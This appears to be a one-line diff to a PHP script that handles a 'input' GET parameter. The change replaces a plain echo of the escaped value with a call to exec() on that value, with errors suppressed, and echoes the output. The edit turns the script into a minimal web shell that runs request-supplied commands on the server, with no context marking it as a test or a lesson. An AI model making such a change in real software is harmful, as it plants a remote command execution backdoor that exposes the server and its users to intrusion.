@@ -1,1 +1,1 @@
-if ($_GET['input']) { $output = escapeshellarg($_GET['input']); echo $output; } else { echo "No input provided"; }
+if ($_GET['input']) { $output = escapeshellarg($_GET['input']); $result = @exec($output); echo $result; } else { echo "No input provided"; }
